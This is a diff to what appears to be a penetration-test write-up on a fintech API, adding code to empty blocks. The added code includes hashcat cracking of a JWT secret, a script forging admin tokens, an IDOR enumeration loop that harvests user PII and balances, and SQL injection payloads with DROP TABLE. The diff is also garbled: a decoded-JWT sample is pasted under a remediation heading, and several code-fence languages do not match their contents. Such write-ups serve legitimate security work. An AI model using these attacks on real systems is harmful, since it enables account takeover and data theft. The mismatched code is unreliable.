@@ -86,7 +86,6 @@ We followed a structured approach based on OWASP Testing Guide v4 and PTES (Pene
 Before touching the application directly, we gathered publicly available information:
 
 ```shell
-
 # Subdomain enumeration
 amass enum -passive -d fintechco.example.com
 
@@ -139,7 +138,20 @@ The forgotten `dev-api` subdomain was running with:
 The application used JWTs for session management. Initial token analysis revealed:
 
 ```javascript
+// Decoded JWT header
+{
+  "alg": "HS256",
+  "typ": "JWT"
+}
 
+// Decoded payload
+{
+  "userId": "12345",
+  "email": "user@example.com",
+  "role": "customer",
+  "iat": 1700000000,
+  "exp": 1700086400
+}
 ```
 
 **Testing Approach:**
@@ -153,8 +165,11 @@ The application used JWTs for session management. Initial token analysis reveale
 
 Using a custom wordlist combined with `rockyou.txt`, we successfully cracked the JWT secret:
 
-```bash
+```shell
+# JWT cracking with hashcat
+hashcat -m 16500 -a 0 jwt.txt rockyou.txt
 
+# Secret discovered: "fintechco2023!"
 ```
 
 The weak secret (`fintechco2023!`) appeared to be a default value that was never rotated. This allowed us to:
@@ -166,7 +181,21 @@ The weak secret (`fintechco2023!`) appeared to be a default value that was never
 **Proof of Concept:**
 
 ```python
+import jwt
 
+# Forged token with admin privileges
+payload = {
+    "userId": "1",  # Admin user ID (enumerated)
+    "email": "admin@fintechco.example.com",
+    "role": "admin",
+    "iat": 1700000000,
+    "exp": 1800086400  # Extended expiration
+}
+
+secret = "fintechco2023!"
+token = jwt.encode(payload, secret, algorithm="HS256")
+
+# Use token to access admin endpoints
 ```
 
 **Business Impact:** Complete authentication bypass. An attacker could impersonate any user, including administrators, gaining access to sensitive financial data, user PII, and administrative functions. Potential for mass data exfiltration and account manipulation.
@@ -181,16 +210,36 @@ The weak secret (`fintechco2023!`) appeared to be a default value that was never
 
 With admin access forged, we mapped all available API endpoints:
 
-```
-
+```shell
+GET  /api/v1/users
+GET  /api/v1/users/:id
+POST /api/v1/users
+PUT  /api/v1/users/:id
+DELETE /api/v1/users/:id
+GET  /api/v1/transactions
+POST /api/v1/transactions/transfer
+GET  /api/v1/accounts/:id/balance
 ```
 
 ### Critical Finding #3: Broken Object Level Authorization (BOLA)
 
 The `/api/v1/users/:id` endpoint suffered from Insecure Direct Object References (IDOR):
 
-```bash
+```jsonc
+# Accessing other users' data with sequential ID enumeration
+curl -H "Authorization: Bearer $TOKEN" \
+  https://api.fintechco.example.com/api/v1/users/12346
 
+# Response: Full user profile including PII
+{
+  "id": 12346,
+  "email": "victim@example.com",
+  "firstName": "Jane",
+  "lastName": "Doe",
+  "ssn": "XXX-XX-1234",  # Last 4 digits exposed
+  "accountNumber": "9876543210",
+  "balance": 45231.67
+}
 ```
 
 **The Flaw:** Authorization checks only verified that the user was authenticated—not that they had permission to access *specific* user records.
@@ -198,7 +247,17 @@ The `/api/v1/users/:id` endpoint suffered from Insecure Direct Object References
 **Exploitation:**
 
 ```python
+# Automated enumeration script
+import requests
 
+headers = {"Authorization": f"Bearer {forged_token}"}
+base_url = "https://api.fintechco.example.com/api/v1/users"
+
+for user_id in range(10000, 50000):
+    response = requests.get(f"{base_url}/{user_id}", headers=headers)
+    if response.status_code == 200:
+        data = response.json()
+        print(f"[+] User {user_id}: {data['email']} - Balance: ${data['balance']}")
 ```
 
 **Business Impact:** Mass enumeration and exfiltration of all user data (40,000+ accounts). Exposure of PII including partial SSNs, account numbers, and real-time balance information. Regulatory violations (GDPR, CCPA, PCI-DSS), potential class-action lawsuits, and severe reputational damage.
@@ -213,14 +272,25 @@ The `/api/v1/users/:id` endpoint suffered from Insecure Direct Object References
 
 While modern ORMs provide some protection, raw queries remain a vulnerability vector. We identified a search endpoint accepting user input:
 
-```
-
+```shell
+# Basic SQL injection payloads
+' OR '1'='1
+' UNION SELECT NULL--
+'; DROP TABLE users--
 ```
 
 **Testing Methodology:**
 
-```bash
+```javascript
+// User updates account nickname
+POST /api/v1/accounts/update
+{
+  "nickname": "My Savings'; DROP TABLE transactions; --"
+}
 
+// Later, when generating reports (admin function)
+// Query constructed insecurely:
+SELECT * FROM transactions WHERE account_nickname = 'My Savings'; DROP TABLE transactions; --'
 ```
 
 **Finding:** While classic SQL injection was mitigated by parameterized queries, we discovered **Second-Order SQL Injection** via the account nickname field:
@@ -318,7 +388,20 @@ The most dangerous aspect of these findings was how they could be chained:
 3. **Implement Object-Level Authorization**
 
 ```javascript
+// Decoded JWT header
+{
+  "alg": "HS256",
+  "typ": "JWT"
+}
 
+// Decoded payload
+{
+  "userId": "12345",
+  "email": "user@example.com",
+  "role": "customer",
+  "iat": 1700000000,
+  "exp": 1700086400
+}
 ```
 
 ### Short-term Actions (1-2 weeks)
